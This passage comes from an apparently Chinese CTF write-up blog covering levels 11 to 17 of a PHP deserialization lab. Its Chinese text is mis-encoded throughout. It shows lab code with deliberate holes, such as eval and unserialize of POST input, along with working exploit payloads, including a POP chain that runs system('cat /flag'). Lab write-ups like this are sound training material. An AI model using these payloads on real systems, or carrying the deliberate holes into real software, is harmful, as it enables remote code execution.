class="string">&quot;sorry,flag is gone!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$flag</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FLAG</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$flag</span>);</span><br></pre></td></tr></table></figure><p>å¾—å‡ºçš„åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼š<code>O:4:&quot;FLAG&quot;:1:{s:4:&quot;flag&quot;;s:8:&quot;FAKEFLAG&quot;;}</code></p><p>ä¿®æ”¹å±æ€§æ•°å€¼å¾—åˆ°æ–°å­—ç¬¦ä¸²<code>O:4:&quot;FLAG&quot;:2:{s:4:&quot;flag&quot;;s:8:&quot;FAKEFLAG&quot;;}</code>ä¼ é€’å³å¯</p><br /><h3 id="Level-12-sleep"><a href="#Level-12-sleep" class="headerlink" title="Level 12: __sleep()"></a>Level 12: __sleep()</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">--- HelloCTF - ååºåˆ—åŒ–é¶åœº å…³å¡ 12 : sleep! --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">å¹´è½»å°±æ˜¯å¥½å•Šï¼Œå€’å¤´å°±ç¡ã€‚</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">serialize() å‡½æ•°ä¼šæ£€æŸ¥ç±»ä¸­æ˜¯å¦å­˜åœ¨ä¸€ä¸ªé­”æœ¯æ–¹æ³• __sleep()ã€‚å¦‚æœå­˜åœ¨ï¼Œè¯¥æ–¹æ³•ä¼šå…ˆè¢«è°ƒç”¨ï¼Œç„¶åæ‰æ‰§è¡Œåºåˆ—åŒ–æ“ä½œã€‚</span></span><br><span class="line"><span class="comment">è¯¥æ–¹æ³•å¿…é¡»è¿”å›ä¸€ä¸ªæ•°ç»„: return array(&#x27;å±æ€§1&#x27;, &#x27;å±æ€§2&#x27;, &#x27;å±æ€§3&#x27;) / return [&#x27;å±æ€§1&#x27;, &#x27;å±æ€§2&#x27;, &#x27;å±æ€§3&#x27;]ã€‚</span></span><br><span class="line"><span class="comment">æ•°ç»„ä¸­çš„å±æ€§åå°†å†³å®šå“ªäº›å˜é‡å°†è¢«åºåˆ—åŒ–ï¼Œå½“å±æ€§è¢« static ä¿®é¥°æ—¶ï¼Œæ— è®ºæœ‰æ— éƒ½æ— æ³•åºåˆ—åŒ–è¯¥å±æ€§ã€‚</span></span><br><span class="line"><span class="comment">å¦‚æœéœ€è¦è¿”å›çˆ¶ç±»ä¸­çš„ç§æœ‰å±æ€§ï¼Œéœ€è¦ä½¿ç”¨åºåˆ—åŒ–ä¸­çš„ç‰¹æ®Šæ ¼å¼ - %00çˆ¶ç±»åç§°%00å˜é‡å (%00 æ˜¯ ASCII å€¼ä¸º 0 çš„ç©ºå­—ç¬¦ null,åœ¨ä»£ç å†…æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡ &quot;\0&quot; - æ³¨æ„åœ¨åŒå¼•å·ä¸­ï¼ŒPHP æ‰ä¼šè§£æè½¬ä¹‰å­—ç¬¦å’Œå˜é‡ã€‚)ã€‚</span></span><br><span class="line"><span class="comment">ä¾‹å¦‚ï¼Œçˆ¶ç±» FLAG çš„ç§æœ‰å±æ€§ private $f; åº”è¯¥åœ¨å­ç±»çš„ __sleep() æ–¹æ³•ä¸­ä»¥ &quot;\0FLAG\0f&quot; çš„æ ¼å¼è¿”å›ã€‚</span></span><br><span class="line"><span class="comment">å¦‚æœè¯¥æ–¹æ³•æœªè¿”å›ä»»ä½•å†…å®¹ï¼Œåºåˆ—åŒ–ä¼šè¢«åˆ¶ç©ºï¼Œå¹¶äº§ç”Ÿä¸€ä¸ª E_NOTICE çº§åˆ«çš„é”™è¯¯ã€‚</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: æ¢å§¬(<span class="doctag">@ProbiusOfficial</span>)</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-07-01 20:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/PHPSerialize-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$f</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$l</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$g</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$x</span>,<span class="variable">$y</span>,<span class="variable">$z</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> [<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;z&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CHALLENGE</span> <span class="keyword">extends</span> <span class="title">FLAG</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$h</span>,<span class="variable">$e</span>,<span class="variable">$l</span>,<span class="variable">$I</span>,<span class="variable">$o</span>,<span class="variable">$c</span>,<span class="variable">$t</span>,<span class="variable">$f</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">chance</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$_GET</span>[<span class="string">&#x27;chance&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">/* FLAG is $h + $e + $l + $I + $o + $c + $t + $f + $f + $l + $a + $g */</span></span><br><span class="line">        <span class="variable">$array_list</span> = [<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;I&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;g&#x27;</span>];</span><br><span class="line">        <span class="variable">$_</span>=<span class="title function_ invoke__">array_rand</span>(<span class="variable">$array_list</span>);<span class="variable">$__</span>=<span class="title function_ invoke__">array_rand</span>(<span class="variable">$array_list</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="variable">$array_list</span>[<span class="variable">$_</span>],<span class="variable">$array_list</span>[<span class="variable">$__</span>],<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">chance</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$FLAG</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FLAG</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$FLAG</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">CHALLENGE</span>());</span><br></pre></td></tr></table></figure><p><code>array_rand($array_list)</code>å‡½æ•°ï¼šä»<code>$array_list</code>ä¸­éšæœºæŠ½å–ä¸€ä¸ªå…ƒç´ </p><p>ç»“åˆhintï¼Œåˆ©ç”¨chanceä¾æ¬¡ä¼ é€’å‚æ•°<code>&#39;h&#39;,&#39;e&#39;,&#39;l&#39;,&#39;I&#39;,&#39;o&#39;,&#39;c&#39;,&#39;t&#39;,&#39;f&#39;,&#39;%00FLAG%00f&#39;,&#39;%00FLAG%00l&#39;,&#39;a&#39;,&#39;g&#39;</code>ç»„åˆæ‹¼æ¥å¾—åˆ°flagï¼Œç”±äºåé¢çš„ä¸¤ä¸ª<code>&#39;f&#39;,&#39;l&#39;</code>æ˜¯çˆ¶ç±»é‡Œé¢çš„ç§æœ‰å±æ€§ï¼Œéœ€è¦è¿”å›éœ€è¦ä½¿ç”¨åºåˆ—åŒ–ä¸­çš„ç‰¹æ®Šæ ¼å¼ ï¼Œå°±æ¯”å¦‚<code>%00FLAG%00f</code></p><br /><h3 id="Level-13-toString"><a href="#Level-13-toString" class="headerlink" title="Level 13: __toString()"></a>Level 13: __toString()</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">--- HelloCTF - ååºåˆ—åŒ–é¶åœº å…³å¡ 13 __toString()  --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">__toString() æ–¹æ³•ç”¨äºä¸€ä¸ªç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶åº”æ€æ ·å›åº”ã€‚ä¾‹å¦‚ echo $obj; åº”è¯¥æ˜¾ç¤ºäº›ä»€ä¹ˆã€‚</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: æ¢å§¬(<span class="doctag">@ProbiusOfficial</span>)</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-07-01 20:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/PHPSerialize-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;I&#x27;m a string ~~~&quot;</span>;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FLAG</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°è¯•ä»¥å­—ç¬¦ä¸²è°ƒç”¨<code>$obj</code>å³å¯åˆ©ç”¨<code>__toString()</code>è¿”å›flag</p><p>ä¼ é€’<code>o=echo $obj;</code>å³å¯</p><br /><h3 id="Level-14-invoke"><a href="#Level-14-invoke" class="headerlink" title="Level 14: __invoke()"></a>Level 14: __invoke()</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">--- HelloCTF - ååºåˆ—åŒ–é¶åœº å…³å¡ 14 : __invoke() --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">å½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œ__invoke() æ–¹æ³•ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ã€‚ä¾‹å¦‚ $obj()ã€‚</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: æ¢å§¬(<span class="doctag">@ProbiusOfficial</span>)</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-07-01 20:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/PHPSerialize-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FLAG</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$x</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$x</span> == <span class="string">&#x27;get_flag&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FLAG</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°è¯•ä»¥å‡½æ•°è°ƒç”¨<code>$obj</code>å³å¯åˆ©ç”¨<code>__invoke()</code>è¿”å›flag</p><p>ä¼ é€’<code>o=$boj(&#39;get_flag&#39;);</code>å³å¯</p><br /><h3 id="Level-15-POPé“¾å‰ç½®"><a href="#Level-15-POPé“¾å‰ç½®" class="headerlink" title="Level 15: POPé“¾å‰ç½®"></a>Level 15: POPé“¾å‰ç½®</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">--- HelloCTF - ååºåˆ—åŒ–é¶åœº å…³å¡ 15 : POPé“¾åˆæ­¥ --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">ä¸–ç•Œçš„æœ¬è´¨å…¶å®å°±æ˜¯å¥—å¨ƒï¼ˆx</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: æ¢å§¬(<span class="doctag">@ProbiusOfficial</span>)</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-07-01 20:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/PHPSerialize-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* FLAG in flag.php */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$b</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable">$b</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$c</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c = <span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$d</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$d</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;d = <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeUp</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;d-&gt;<span class="title function_ invoke__">action</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">destnation</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="variable">$cmd</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd-&gt;a-&gt;b-&gt;c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ˜¯ä¸ªå¥—å¨ƒï¼Œç›®çš„æ˜¯è®©<code>$this-&gt;cmd-&gt;a-&gt;b-&gt;c</code>çš„å€¼ä¸ºè¦æ‰§è¡Œçš„ä»»æ„å‘½ä»¤ï¼Œä¸ºäº†è°ƒç”¨<code>action()</code>ï¼Œè¿˜éœ€è¦å¥—ä¸€å±‚Dç±»</p><p>æ„é€ é“¾</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$load</span>=<span class="keyword">new</span> <span class="title function_ invoke__">D</span>();</span><br><span class="line"><span class="variable">$load</span>-&gt;d=<span class="keyword">new</span> <span class="title function_ invoke__">destnation</span>();</span><br><span class="line"><span class="variable">$load</span>-&gt;d-&gt;cmd=<span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$load</span>-&gt;d-&gt;cmd-&gt;a=<span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$load</span>-&gt;d-&gt;cmd-&gt;a-&gt;b=<span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line"><span class="variable">$load</span>-&gt;d-&gt;cmd-&gt;a-&gt;b-&gt;c=<span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$load</span>);</span><br></pre></td></tr></table></figure><p><code>O:1:&quot;D&quot;:1:{s:1:&quot;d&quot;;O:10:&quot;destnation&quot;:1:{s:3:&quot;cmd&quot;;O:1:&quot;A&quot;:1:{s:1:&quot;a&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:20:&quot;system(&#39;cat /flag&#39;);&quot;;}}}}}</code></p><p>ä¼ å…¥å³å¯</p><br /><h3 id="Level-16-POPé“¾æ„é€ "><a href="#Level-16-POPé“¾æ„é€ " class="headerlink" title="Level 16: POPé“¾æ„é€ "></a>Level 16: POPé“¾æ„é€ </h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">--- HelloCTF - ååºåˆ—åŒ–é¶åœº å…³å¡ 16 : zePOP--- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">__wakeUp() æ–¹æ³•ç”¨äºååºåˆ—åŒ–æ—¶è‡ªåŠ¨è°ƒç”¨ã€‚ä¾‹å¦‚ unserialize()ã€‚</span></span><br><span class="line"><span class="comment">__invoke() æ–¹æ³•ç”¨äºä¸€ä¸ªå¯¹è±¡è¢«å½“æˆå‡½æ•°æ—¶åº”è¯¥å¦‚ä½•å›åº”ã€‚ä¾‹å¦‚ $obj() åº”è¯¥æ˜¾ç¤ºäº›ä»€ä¹ˆã€‚</span></span><br><span class="line"><span class="comment">__toString() æ–¹æ³•ç”¨äºä¸€ä¸ªç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶åº”æ€æ ·å›åº”ã€‚ä¾‹å¦‚ echo $obj; åº”è¯¥æ˜¾ç¤ºäº›ä»€ä¹ˆã€‚</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">è¯•ç€æŠŠä»–ä»¬ä¸²èµ·æ¥å§ww</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: æ¢å§¬(<span class="doctag">@ProbiusOfficial</span>)</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-07-01 20:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/PHPSerialize-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>:   hello-ctf.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">include</span> <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$f</span> = <span class="variable language_">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$f</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">INIT</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeUp</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name.<span class="string">&#x27; is awake!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸éš¾å‘ç°åˆ©ç”¨é¡ºåºæ˜¯<code>__wakeUp()</code>-&gt;<code>__toString</code>-&gt;<code>__invoke()</code>ï¼Œæœ€åéœ€è¦åŒ…å«<code>flag.php</code></p><p>æ„é€ é“¾</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$new</span>=<span class="keyword">new</span> INIT;</span><br><span class="line"><span class="variable">$new</span>-&gt;name=<span class="keyword">new</span> B;</span><br><span class="line"><span class="variable">$new</span>-&gt;name-&gt;b=<span class="keyword">new</span> A;</span><br><span class="line"><span class="variable">$new</span>-&gt;name-&gt;b-&gt;a=<span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$new</span>);</span><br></pre></td></tr></table></figure><p><code>O:4:&quot;INIT&quot;:1:{s:4:&quot;name&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;A&quot;:1:{s:1:&quot;a&quot;;s:8:&quot;flag.php&quot;;}}}</code>ï¼Œä¼ å…¥å³å¯</p><br /><h3 id="ï¼ˆç‰¹æ€§ï¼‰Level-17-å­—ç¬¦ä¸²é€ƒé€¸åŸºç¡€-æ— ä¸­ç”Ÿæœ‰"><a href="#ï¼ˆç‰¹æ€§ï¼‰Level-17-å­—ç¬¦ä¸²é€ƒé€¸åŸºç¡€-æ— ä¸­ç”Ÿæœ‰" class="headerlink" title="ï¼ˆç‰¹æ€§ï¼‰Level 17: å­—ç¬¦ä¸²é€ƒé€¸åŸºç¡€-æ— ä¸­ç”Ÿæœ‰"></a>ï¼ˆç‰¹æ€§ï¼‰Level 17: å­—ç¬¦ä¸²é€ƒé€¸åŸºç¡€-æ— ä¸­ç”Ÿæœ‰</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">--- HelloCTF - ååºåˆ—åŒ–é¶åœº å…³å¡ 17 : å­—ç¬¦ä¸²é€ƒé€¸åŸºç¡€ --- </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„è§„åˆ™ç‰¹æ€§_æ— ä¸­ç”Ÿæœ‰ï¼šå½“æˆå‘˜å±æ€§çš„å®é™…æ•°é‡ç¬¦åˆåºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­å¯¹åº”å±æ€§å€¼æ—¶ï¼Œä¼¼ä¹ä¸ä¼šåšä»»ä½•æ£€æŸ¥ï¼Ÿ</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: æ¢å§¬(<span class="doctag">@ProbiusOfficial</span>)</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2024-07-01 20:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Repo</span>:   github.com/ProbiusOfficial/PHPSerialize-labs</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>:  admin<span class="doctag">@hello</span>-ctf.com</span></span><br><span 